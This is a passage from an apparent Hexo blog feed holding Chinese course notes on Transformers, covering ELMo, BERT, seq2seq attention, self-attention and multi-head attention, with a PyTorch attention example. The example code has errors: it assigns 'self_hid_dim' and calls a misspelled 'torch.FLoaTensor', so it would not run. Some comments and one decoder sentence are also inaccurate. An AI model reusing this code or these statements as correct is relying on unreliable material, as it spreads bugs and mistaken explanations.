id="对比cnn">对比CNN</h2><p>根据BERT的编码过程，会联想到计算机视觉中使用VGGNet等网络的卷积神经网络+全连接网络做分类任务。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917145224008.png" class="" title="CNN"><h2 id="词嵌入embedding进展">词嵌入(Embedding)进展</h2><p>单词不能直接输入机器学习模型，而需要某种数值表现形式，以便模型能够在计算中使用。通过Word2Vec，我们可以使用一个向量来恰当地表达单词，并捕捉这些单词的语义以及单词与单词之间的关系，以及句法，语法关系。</p><p>单词 "stick" 的 Glove词嵌入embedding向量表示：一个由200个浮点数组成的向量（四舍五入到小数点后两位）。</p><p>由于这些向量都很长，且全部是数字，所以在文章中我使用以下基本形状来表示向量：</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917145634135.png" class="" title="vecotr"><h2 id="语境问题">语境问题</h2><p>一些研究人员指出，像 "stick"这样的词有多种含义。为什么不能根据它使用的上下文来学习对应的词嵌入呢？这样既能捕捉单词的语义信息，又能捕捉上下文的语义信息。于是，语境化的词嵌入模型应运而生：<strong>ELMO</strong>。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917145809419.png" class="" title="ELMO"><p>ELMo没有对每个单词使用固定的词嵌入，而是在为每个词分配词嵌入之前，查看整个句子，融合上下文信息。它使用在特定任务上经过训练的双向LSTM来创建这些词嵌入。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917145951135.png" class="" title="ELMO embedding"><p>ELMo通过训练，预测单词序列中的下一个词，从而获得了语言理解能力，这项任务被称为语言建模。要实现ELMo很方便，因为我们有大量文本数据，模型可以从这些数据中学习，而不需要额外的标签。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917150037463.png" class="" title="ELMO训练"><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917150130266.png" class="" title="image-20210917150130266"><h2 id="transformer超越lstm">Transformer：超越LSTM</h2><ul><li>因为 Transformer 可以比 LSTM 更好地处理长期依赖</li><li>Transformer可以对输入进行并行运算。</li></ul><h2 id="openai-transformer">OpenAI Transformer</h2><p>沿着LSTM语言模型预训练的路子，将LSTM替换成Transformer结构后（相当于），直接语言模型预训练的参数给予下游任务监督数据进行微调，与最开始用于翻译seq2seq的Transformer对比来看，相当于只使用了Decoder部分。有了Transformer结构和语言模型任务设计，直接使用大规模未标记的数据不断得预测下一个词：只需要把7000 本书的文字依次扔给模型 ，然后让它不断学习生成下一个词即可。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917150942879.png" class="" title="open ai"><h2 id="bertdecoder到encoder">BERT：Decoder到Encoder</h2><p>OpenAITransformer为我们提供了一个基于Transformer的预训练网络。但是在把LSTM换成Transformer的过程中，有些东西丢失了。比如之前的ELMo的语言模型是双向的，但 OpenAITransformer 只训练了一个前向的语言模型。我们是否可以构建一个基于Transformer 的语言模型，它既向前看，又向后看（用技术术语来说 -融合上文和下文的信息）。那答案就是BERT：基于双向Transformer的encoder，在Maskedlanguage model上进行预训练，最终在多项NLP下游任务重取得了SOTA效果。</p>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>自然语言处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Datawhale组队学习</tag>
      
      <tag>NLP入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Transformers的自然语言处理(NLP)入门(一)</title>
    <link href="/2021/09/13/nlp-transformer/nlp-transformer-1/"/>
    <url>/2021/09/13/nlp-transformer/nlp-transformer-1/</url>
    
    <content type="html"><![CDATA[<p>本文为参加Datawhale组队学习时所写，如若需了解细致内容，请去到Datawhale官方开源课程<ahref="https://datawhalechina.github.io/learn-nlp-with-transformers/#/">基于transformers的自然语言处理(NLP)入门(datawhalechina.github.io)</a></p><h1 id="前言">前言</h1><h2 id="常见的nlp任务">常见的NLP任务</h2><ul><li><p><strong>文本分类</strong>对单个，两个或者多段文本进行分类</p></li><li><p><strong>序列标注</strong>对文本序列中的token，字或者词进行分类</p></li><li><p><strong>问答任务</strong></p><ul><li><strong>抽取式问答</strong> 从一段给定的文本之中找到答案</li><li><strong>多选式回答</strong> 从多个选项中选出一个正确答案</li></ul></li><li><p><strong>生成任务</strong></p><ul><li><strong>语言模型</strong> 根据已有的一段文字生成一个字</li><li><strong>摘要生成</strong> 根据一大段文字生成一小段总结性文字</li><li><strong>机器翻译</strong> 将源语言翻译成为目标语言</li></ul></li></ul><span id="more"></span><h2 id="transformer的兴起">Transformer的兴起</h2><p>2017年，Transformer模型结构首次被提出并在机器翻译上取得了效果。2018年Bert模型使用Transformer模型结构进行大规模语言预训练，刷新了许多NLP任务榜单的最高分。2019年-2021年，研究人员将<strong>Transformer</strong>这种模型结构<strong>预训练+微调</strong>这种方式结合，提出了一系列Transformer模型结构，训练方法的改进。Transformer的模型结构优异。使得其参数量可以非常庞大从而容纳更多的信息，随着预训练不断提升以及近年来计算能力的提升，越来越好的Transformer不断涌现。</p><figure><imgsrc="https://huggingface.co/course/static/chapter1/model_parameters.png"alt="Number of parameters of recent Transformers models" /><figcaption aria-hidden="true">Number of parameters of recentTransformers models</figcaption></figure><h1 id="transformer相关原理">Transformer相关原理</h1><h1 id="图解attention">图解Attention</h1><p>基于循环神经网络(RNN)的一类seq2seq模型，在处理长文本时遇到了挑战，对于长文本中不同位置的信息进行attention(注意力机制)有助于提高RNN的模型效果。</p><h2 id="seq2seq框架">seq2seq框架</h2><p>seq2seq(sequence tosequence)是一中常见的NLP模型结构，“序列到序列”。从一个文本得到一个新的文本。</p><h2 id="seq2seq细节">seq2seq细节</h2><p>seq2seq模型由编码器和解码器组成。编码器会处理输入序列中的每个元素并获得输入信息，这些信息会被转换成为一个向量（称为context向量）。当我们处理完整个输入序列后，编码器把context向量发送给解码器，解码器通过context向量中的信息，逐个元素输出新的序列。</p><p>eq2seq模型中的编码器和解码器一般采用的是循环神经网络RNN。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210914143639429.png" class="" title="image-20210914143639429"><p>context向量对应上图中间浮点数向量。在下文中，我们会可视化这些数字向量，使用更明亮的色彩来表示更高的值，如上图右边所示</p><p>context向量本质上是一组浮点数，context的数组长度是基于编码层的RNN的隐藏层神经元数量的。</p><p>RNN如何处理输入序列？</p><ol type="1"><li>序列输入时一个句子，setence = {w1, w2, ..., wn}</li><li>RNN首先将句子中的每一个词映射成为一个向量得到一个向量序列，X = {x1,x2, ..., xn}</li><li>然后在处理第t∈[1,n]个时间步的序列输入x<sub>t</sub>时，RNN网络的输入和输出可以表示为：h<sub>t</sub>=RNN(x<sub>t</sub>, h<sub>t</sub>)<ul><li>输入：RNN在时间步t的输入之一为单词w<sub>t</sub>经过映射得到的向量x<sub>t</sub>。</li><li>输入：RNN另一个输入为上一个时间步t-1得到的hiddenstate向量h<sub>t-1</sub>，同样是一个向量。</li><li>输出：RNN在时间步t的输出为h<sub>t</sub> hidden state向量。</li></ul></li></ol><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210914145854549.png" class="" title="image-20210914145854549"><p>上图左边每个单词经过wordembedding算法之后得到中间一个对应的4维的向量。</p><p>编码器在每一个是时间步得到hiddenstate，并将最终的state传输给解码器，解码器根据编码器给予的最后一个hiddenstate信息解码处输出序列，最后一个 hiddenstate实际上是我们上文提到的context向量。</p><h2 id="attention">Attention</h2><p>基于RNN的seq2seq模型编码器所有信息都编码到了一个context向量中，便是这类模型的瓶颈。一方面单个向量很难包含所有文本序列的信息，另一方面RNN递归地编码文本序列使得模型在处理长文本时面临非常大的挑战。</p><p>attention注意力机制，使得seq2seq模型可以有区分度、有重点地关注输入序列。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210914153123182.png" class="" title="image-20210914153123182"><p>图：在第 7个时间步，注意力机制使得解码器在产生英语翻译student英文翻译之前，可以将注意力集中在法语输入序列的：étudiant。这种有区分度得attention到输入序列的重要信息，使得模型有更好的效果。</p><p>带有注意力的seq2seq模型</p><ul><li>编码器把更多的数据传递给解码器，而不是只传递最后的hidden state</li></ul><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210914153656605.png" class="" title="image-20210914153656605"><ul><li>注意力模型的解码器在产生输出之前，做了一个额外的attention处理。如下图所示，具体为：<ul><li>由于编码器中每个 hiddenstate（隐藏层状态）都对应到输入句子中一个单词，那么解码器要查看所有接收到的编码器的hidden state（隐藏层状态）。</li><li>给每个 hiddenstate（隐藏层状态）计算出一个分数（我们先忽略这个分数的计算过程）。</li><li>所有hidden state（隐藏层状态）的分数经过softmax进行归一化。</li><li>将每个 hiddenstate（隐藏层状态）乘以所对应的分数，从而能够让高分对应的 hiddenstate（隐藏层状态）会被放大，而低分对应的 hiddenstate（隐藏层状态）会被缩小。</li><li>将所有hiddenstate根据对应分数进行加权求和，得到对应时间步的context向量。</li></ul></li></ul><p><strong>seq2seq模型解码器全流程</strong></p><ol type="1"><li>注意力模型的解码器 RNN 的输入包括：一个word embedding向量，和一个初始化好的解码器 hidden state，图中是h<sub>init</sub>。</li><li>RNN 处理上述的 2 个输入，产生一个输出和一个新的 hiddenstate，图中为h4。</li><li>注意力的步骤：我们使用编码器的所有 hidden state向量和 h4向量来计算这个时间步的context向量（C4）。</li><li>我们把 h4 和 C4 拼接起来，得到一个橙色向量。</li><li>我们把这个橙色向量输入一个前馈神经网络（这个网络是和整个模型一起训练的）。</li><li>根据前馈神经网络的输出向量得到输出单词：假设输出序列可能的单词有N个，那么这个前馈神经网络的输出向量通常是N维的，每个维度的下标对应一个输出单词，每个维度的数值对应的是该单词的输出概率。</li><li>在下一个时间步重复1-6步骤。</li></ol><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/1-7-attention-pro.gif" class="" title="1-7-attention-pro"><h1 id="图解transformer">图解Transformer</h1><p>Transoformer整体结构图，左半部分为编码器(encoder)，右半部分为解码器(decoder)。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/2-transformer.png" class="" title="2-transformer"><h2 id="transformer宏观结构">Transformer宏观结构</h2><p>Transformer最开始提出来解决机器翻译任务，因此可以看作是seq2seq模型的一种。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915201330887.png" class="" title="image-20210915201330887"><p>编码器和解码器都是<strong>多层组成</strong>的。层数并不固定，每一层编码器和解码器结构是一样的，不同层编码器和解码器不共享参数。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915201613940.png" class="" title="image-20210915201613940"><p>单层encoder由两部分组成</p><ul><li>Self-Attention Layer</li><li>Feed Forward Neural Network (前馈神经网络，FFNN)</li></ul><p>编译器的输入文本序列最开始经过embedding转换，得到每一个单词的向量表示，然后经过self-attention层进行变换和信息交互得到新的向量表示，self-attention处理一个词时，不仅会使用这个词本身，还会使用上下文的信息，后通过FFNN得到新的向量进入下一层，这一过程中，单词的向量表示的维度并不会发生改变。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915203237569.png" class="" title="encoder"><p>解码器在self-attention和FFNN中间插入了一个<strong>Encoder-DecoderAttention</strong>层，这一层帮助解码器聚焦于输入序列中最相关的部分，使得解码器在不同的时候注意的对象不同。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/2-decoder.webp" class="" title="decoder"><h2 id="transformer结构细节">Transformer结构细节</h2><h3 id="输入处理">输入处理</h3><h4 id="词向量">词向量</h4><p>和常见的NLP 任务一样，我们首先会使用词嵌入算法（embeddingalgorithm），将输入文本序列的每个词转换为一个词向量。实际应用中的向量一般是256 或者 512 维。</p><p>假设我们的输入文本是序列包含了3个词，那么每个词可以通过词嵌入算法得到一个4维向量(简化过程)，于是整个输入被转化成为一个向量序列。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915204342805.png" class="" title="embedding"><p>如果每一个句子的长度不一样，我们会选择一个合适的长度，对于较短的句子进行填充(padding)，对于较长的句子进行截断。</p><h4 id="位置向量">位置向量</h4><p>Transformer模型对每个输入的词向量都加上了一个位置向量。这些向量有助于确定每个单词的位置特征，或者句子中不同单词之间的距离特征，可以为模型提供更多有意义的信息，比如词的位置，词之间的距离等。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915204718171.png" class="" title="位置编码"><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915205022037.png" class="" title="位置向量设计表达式"><p>上面表达式中的pospos代表词的位置，d<sub>model</sub>代表位置向量的维度，i∈[0,dmodel)代表位置d<sub>model</sub>维位置向量第i维。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915205400940.png" class="" title="image-20210915205400940"><p>这种方法的优点是：可以扩展到未知的序列长度。</p><h3 id="编码器encoder">编码器encoder</h3><p>编码部分的输入文本序列经过输入处理之后得到了一个向量序列，这个向量序列将被送入第1层编码器，第1层编码器输出的同样是一个向量序列，再接着送入下一层编码器：第1层编码器的输入是融合位置向量的词向量，<em>更上层编码器的输入则是上一层编码器的输出</em>。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915205626346.png" class="" title="encoder序列向量流动"><h3 id="self-attention层">Self-attention层</h3><p>我们要翻译的句子为：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">The animal didn<span class="hljs-comment">&#x27;t cross the street because it was too tired</span><br></code></pre></td></tr></table></figure><p>这个句子中it这一个指代词的具体含义是什么？</p><p>RNN 在处理序列中的一个词时，会考虑句子前面的词传过来的<em>hiddenstate</em>，而<em>hidden state</em>就包含了前面的词的信息；而<em>SelfAttention</em>机制值得是，当前词会直接关注到自己句子中前后相关的所有词语。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915210106476.png" class="" title="slef-attention"><h4 id="self-attention细节">self-attention细节</h4><p>假设一句话包含两个单词：ThinkingMachines。自注意力的一种理解是：Thinking-Thinking，Thinking-Machines，Machines-Thinking，Machines-Machines，共2<sup>2</sup>种两两attention。</p><ul><li>第1步：对输入编码器的词向量进行线性变换得到：Query向量:q1,q2，Key向量: k1,k2，Value向量:v1,v2。这3个向量是词向量分别和3个参数矩阵相乘得到的，而这个矩阵也是是模型要学习的参数。</li></ul><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915210443220.png" class="" title="query-key-value"><p>attention计算的逻辑常常可以描述为：query和key计算相关或者叫attention得分，然后根据attention得分对value进行加权求和。</p><ul><li><p>第2步：计算AttentionScore（注意力分数）。假设我们现在计算第一个词<em>Thinking</em>的Attention Score（注意力分数），需要根据<em>Thinking</em>对应的词向量，对句子中的其他词向量都计算一个分数。</p><p>这些分数决定了我们在编码<em>Thinking</em>这个词时，需要对句子中其他位置的词向量的权重。Attentionscore是根据"<em>Thinking</em>" 对应的 Query 向量和其他位置的每个词的 Key向量进行点积得到的。Thinking的第一个AttentionScore就是q1和k1的内积，第二个分数就是q1和k2的点积。这个计算过程在下图中进行了展示，下图里的具体得分数据是为了表达方便而自定义的。</p></li></ul><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915210721367.png" class="" title="attention score"><ul><li>第3步：把每个分数除以<spanclass="math inline">\(\sqrt{d_k}\)</span>,d<sub>k</sub>是Key向量的维度。你也可以除以其他数，除以一个数是为了在反向传播时，求梯度时更加稳定。</li><li>第4步：接着把这些分数经过一个Softmax函数，Softmax可以将分数归一化，这样使得分数都是正数并且加起来等于1，如下图所示。这些分数决定了Thinking词向量，对其他所有位置的词向量分别有多少的注意力。</li></ul><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915210845022.png" class="" title="attention score"><ul><li><p>第5步：得到每个词向量的分数后，将分数分别与对应的Value向量相乘。这种做法背后的直觉理解就是：对于分数高的位置，相乘后的值就越大，我们把更多的注意力放到了它们身上；对于分数低的位置，相乘后的值就越小，这些位置的词可能是相关性不大的。</p></li><li><p>第6步：把第5步得到的Value向量相加，就得到了SelfAttention在当前位置（这里的例子是第1个位置）对应的输出。</p></li><li><p>最后，在下图展示了 对第一个位置词向量计算Self Attention的全过程。最终得到的当前位置（这里的例子是第一个位置）词向量会继续输入到前馈神经网络。注意：上面的6个步骤每次只能计算一个位置的输出向量，在实际的代码实现中，SelfAttention的计算过程是使用矩阵快速计算的，一次就得到所有位置的输出向量。</p></li></ul><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915212410785.png" class="" title="attention后的向量表示"><h4 id="self-attention矩阵计算">self-attention矩阵计算</h4><p>将self-attention计算6个步骤中的向量放一起，比如<spanclass="math inline">\(X=[x_1;x_2]X=[x1;x2]\)</span>，便可以进行矩阵计算啦。充分利用GPU的优势，加快速度。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915212800378.png" class="" title="矩阵计算"><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210915212824098.png" class="" title="矩阵输出"><h4 id="多头注意力机制">多头注意力机制</h4><ul><li>它扩展了模型关注不同位置的能力。当我们翻译句子：<code>The animal didn’t cross the street because it was too tired</code>时，我们不仅希望模型关注到"it"本身，还希望模型关注到"The"和“animal”，甚至关注到"tired"。这时，多头注意力机制会有帮助</li><li>多头注意力机制赋予attention层多个子空间表示。多头注意力机制会有多组权重矩阵，因此可以将X变换到更多种子空间进行表示。</li></ul><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916144921044.png" class="" title="多头注意力机制"><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916145207331.png" class="" title="z矩阵"><p>由于前馈神经网络层接收的是 1个矩阵（其中每行的向量表示一个词），而不是 8个矩阵，所以我们直接把8个子矩阵拼接起来得到一个大的矩阵，然后和另一个权重矩阵W^OWO相乘做一次变换，映射到前馈神经网络层所需要的维度。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916145235108.png" class="" title="子矩阵映射变换"><p>运用多头注意力机制后</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916145447947.png" class="" title="运用多头注意力机制后"><h4 id="attention代码实例">Attention代码实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiheadAttention</span>(nn.Module):<br>    <span class="hljs-comment"># n_heads: 多头注意力的数量</span><br>    <span class="hljs-comment"># hid_dim: 每个词输出的向量维度</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, hid_dim, n_heads, dropout</span>):<br>        <span class="hljs-built_in">super</span>(MultiheadAttention, self).__init__()<br>        self_hid_dim = hid_dim<br>        self.n_heads = n_heads<br>        <br>        <span class="hljs-comment"># 强制hid_dim必须整除h</span><br>        <span class="hljs-keyword">assert</span> hid_dim % n_heads == <span class="hljs-number">0</span><br>        <span class="hljs-comment"># 定义W_q矩阵</span><br>        self.w_q = nn.Linear(hid_dim, hid_dim)<br>        <span class="hljs-comment"># 定义W_k矩阵</span><br>        self.w_k = nn.Linear(hid_dim, hid_dim)<br>        <span class="hljs-comment"># 定义W_v矩阵</span><br>        self.w_v = nn.Linear(hid_dim, hid_dim)<br>        <br>        self.fc = nn.Linear(hid_dim, hid_dim)<br>        self.do = nn.Dropout(dropout)<br>        <br>        <span class="hljs-comment"># 缩放</span><br>        self.scale = torch.sqrt(torch.FLoaTensor([hid_dim // n_heads]))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, query, key, value, mask=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-comment"># 注意 Q，K，V的在句子长度这一个维度的数值可以一样，可以不一样。</span><br>        <span class="hljs-comment"># K: [64,10,300], 假设batch_size 为 64，有 10 个词，每个词的 Query 向量是300 维</span><br>        bsz = query.shape[<span class="hljs-number">0</span>]<br>        Q = self.w_q(query)<br>        K = self.w_k(key)<br>        V = self.w_v(value)<br>        <br>        <span class="hljs-comment"># 这里把 K Q V 矩阵拆分为多组注意力</span><br>        <span class="hljs-comment"># 最后一维就是是用 self.hid_dim // self.n_heads 来得到的，表示每组注意力的向量长度, 每个head 的向量长度是：300/6=50</span><br>        <span class="hljs-comment"># 64 表示 batch size，6 表示有 6组注意力，10 表示有 10 词，50表示每组注意力的词的向量长度</span><br>        <span class="hljs-comment"># K: [64,10,300] 拆分多组注意力 -&gt; [64,10,6,50] 转置得到 -&gt; [64,6,10,50]</span><br>        <span class="hljs-comment"># V: [64,10,300] 拆分多组注意力 -&gt; [64,10,6,50] 转置得到 -&gt; [64,6,10,50]</span><br>        <span class="hljs-comment"># Q: [64,12,300] 拆分多组注意力 -&gt; [64,12,6,50] 转置得到 -&gt; [64,6,12,50]</span><br>        <span class="hljs-comment"># 转置是为了把注意力的数量 6 放到前面，把 10 和 50 放到后面，方便下面计算</span><br>        Q = Q.view(bsz, -<span class="hljs-number">1</span>, self.n_heads, self.hid_dim //<br>                   self.n_heads).permute(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)<br>        K = K.view(bsz, -<span class="hljs-number">1</span>, self.n_heads, self.hid_dim //<br>                   self.n_heads).permute(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)<br>        V = V.view(bsz, -<span class="hljs-number">1</span>, self.n_heads, self.hid_dim //<br>                   self.n_heads).permute(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)<br><br>        <span class="hljs-comment"># 第 1 步：Q 乘以 K的转置，除以scale</span><br>        <span class="hljs-comment"># [64,6,12,50] * [64,6,50,10] = [64,6,12,10]</span><br>        <span class="hljs-comment"># attention：[64,6,12,10]</span><br>        attention = torch.matmul(Q, K.permute(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)) / self.scale<br><br>        <span class="hljs-comment"># 如果 mask 不为空，那么就把 mask 为 0 的位置的 attention 分数设置为 -1e10，这里用“0”来指示哪些位置的词向量不能被attention到，比如padding位置，当然也可以用“1”或者其他数字来指示，主要设计下面2行代码的改动。</span><br>        <span class="hljs-keyword">if</span> mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            attention = attention.masked_fill(mask == <span class="hljs-number">0</span>, -<span class="hljs-number">1e10</span>)<br><br>        <span class="hljs-comment"># 第 2 步：计算上一步结果的 softmax，再经过 dropout，得到 attention。</span><br>        <span class="hljs-comment"># 注意，这里是对最后一维做 softmax，也就是在输入序列的维度做 softmax</span><br>        <span class="hljs-comment"># attention: [64,6,12,10]</span><br>        attention = self.do(torch.softmax(attention, dim=-<span class="hljs-number">1</span>))<br><br>        <span class="hljs-comment"># 第三步，attention结果与V相乘，得到多头注意力的结果</span><br>        <span class="hljs-comment"># [64,6,12,10] * [64,6,10,50] = [64,6,12,50]</span><br>        <span class="hljs-comment"># x: [64,6,12,50]</span><br>        x = torch.matmul(attention, V)<br><br>        <span class="hljs-comment"># 因为 query 有 12 个词，所以把 12 放到前面，把 50 和 6 放到后面，方便下面拼接多组的结果</span><br>        <span class="hljs-comment"># x: [64,6,12,50] 转置-&gt; [64,12,6,50]</span><br>        x = x.permute(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>).contiguous()<br>        <span class="hljs-comment"># 这里的矩阵转换就是：把多组注意力的结果拼接起来</span><br>        <span class="hljs-comment"># 最终结果就是 [64,12,300]</span><br>        <span class="hljs-comment"># x: [64,12,6,50] -&gt; [64,12,300]</span><br>        x = x.view(bsz, -<span class="hljs-number">1</span>, self.n_heads * (self.hid_dim // self.n_heads))<br>        x = self.fc(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br><span class="hljs-comment"># batch_size 为 64，有 12 个词，每个词的 Query 向量是 300 维</span><br>query = torch.rand(<span class="hljs-number">64</span>, <span class="hljs-number">12</span>, <span class="hljs-number">300</span>)<br><span class="hljs-comment"># batch_size 为 64，有 12 个词，每个词的 Key 向量是 300 维</span><br>key = torch.rand(<span class="hljs-number">64</span>, <span class="hljs-number">10</span>, <span class="hljs-number">300</span>)<br><span class="hljs-comment"># batch_size 为 64，有 10 个词，每个词的 Value 向量是 300 维</span><br>value = torch.rand(<span class="hljs-number">64</span>, <span class="hljs-number">10</span>, <span class="hljs-number">300</span>)<br>attention = MultiheadAttention(hid_dim=<span class="hljs-number">300</span>, n_heads=<span class="hljs-number">6</span>, dropout=<span class="hljs-number">0.1</span>)<br>output = attention(query, key, value)<br><span class="hljs-comment">## output: torch.Size([64, 12, 300])</span><br><span class="hljs-built_in">print</span>(output.shape) <br>        <br></code></pre></td></tr></table></figure><h4 id="残差连接">残差连接</h4><p>编码器的每个子层（Self Attention 层和FFNN）都有一个残差连接和层标准化（layer-normalization），如下图所示。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916152516472.png" class="" title="残差"><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916152608551.png" class="" title="标准化细节"><p>假设一个 Transformer 是由 2层编码器和两层解码器组成的，将全部内部细节展示起来如下图所示。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916152656516.png" class="" title="2层transformer"><h3 id="解码器">解码器</h3><p>编码器一般有多层，第一个编码器的输入是一个序列文本，最后一个编码器输出是一组序列向量，这组序列向量会作为解码器的K、V输入，其中K=V=解码器输出的序列向量表示。这些注意力向量将会输入到每个解码器的Encoder-DecoderAttention层，这有助于解码器把注意力集中到输入序列的合适位置</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/transformer_decoding_1.gif" class="" title="transformer_decoding_1"><p>解码（decoding）阶段的每一个时间步都输出一个翻译后的单词（这里的例子是英语翻译），解码器当前时间步的输出又重新作为输入Q和编码器的输出K、V共同作为下一个时间步解码器的输入。然后重复这个过程，直到输出一个结束符。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/2-decoder.gif" class="" title="decoder"><p>解码器中的 Self Attention 层，和编码器中的 Self Attention层的区别：</p><ol type="1"><li>在解码器里，Self Attention层只允许关注到输出序列中早于当前位置之前的单词。具体做法是：在 SelfAttention 分数经过 Softmax层之前，屏蔽当前位置之后的那些位置（将attention score设置成-inf）。</li><li>解码器 Attention层是使用前一层的输出来构造Query 矩阵，而Key矩阵和Value矩阵来自于编码器最终的输出。</li></ol><h2 id="线性层和softmax">线性层和softmax</h2><p>线性层就是一个普通的全连接神经网络，可以把解码器输出的向量，映射到一个更大的向量，这个向量称为logits 向量：假设我们的模型有 10000 个英语单词（模型的输出词汇表），此logits 向量便会有 10000 个数字，每个数表示一个单词的分数。</p><p>然后，Softmax层会把这些分数转换为概率（把所有的分数转换为正数，并且加起来等于1）。然后选择最高概率的那个数字对应的词，就是这个时间步的输出单词。</p><h2 id="损失函数">损失函数</h2><p>Transformer训练的时候，需要将解码器的输出和label一同送入损失函数，以获得loss，最终模型根据loss进行方向传播。</p><p>只要Transformer解码器预测了组概率，我们就可以把这组概率和正确的输出概率做对比，然后使用反向传播来调整模型的权重，使得输出的概率分布更加接近整数输出。</p><img src="/2021/09/13/nlp-transformer/nlp-transformer-1/image-20210916153706279.png" class="" 